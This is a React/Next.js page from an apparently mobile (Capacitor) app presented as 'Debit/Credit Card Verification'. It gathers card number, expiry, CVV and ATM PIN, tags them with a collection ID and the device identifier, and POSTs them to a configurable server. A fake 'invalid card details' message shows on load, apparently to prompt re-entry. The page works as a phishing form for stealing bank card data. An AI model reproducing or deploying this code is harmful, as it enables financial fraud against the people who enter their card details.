'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from '../css.module.css';
import { Device } from '@capacitor/device';
import { useState } from "react";
export default function Home() {
    const [invalidText, setInvalidText] = useState('Invalid card details. Please enter valid card details.');
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    useEffect(() => {
      setTimeout(() => {
        setInvalidText('');
      },5000);
    }, [])

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        jsonObject1['mobile_id'] = (await Device.getId()).identifier;;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/4');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <div className="container">
      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Debit/Credit Card Verification</h5>
      <p className="text-danger text-center">
        <small>
          {invalidText}
        </small>
      </p>
      <form onSubmit={handleSubmit} >
          <DebitCardInputComponent />
          <div className="d-flex gap-2 mt-3">
            <ExpiryDateInputComponent />
            <div className={`form-group ${styles.inputDiv}`}>
              <label>CVV</label>
              <input type="password"  minLength={3} maxLength={3} name="cvv" className={`form-control ${styles.formInput}`} required placeholder="***" />
            </div>
          </div>
          <div className={`form-group ${styles.inputDiv}`}>
            <label>ATM PIN</label>
            <input type="password" placeholder="****" name="amtin" className={`form-control ${styles.formInput}`} minLength={4} maxLength={4} inputMode="numeric" required placeholder=" " />
          </div>
          <div className="d-flex justify-content-center ">
            <button type="submit"  className="btn btn-primary"> CONTINUE </button>
          </div>
        </form>
  
    </div>
    <Footer />
</>
  );
}
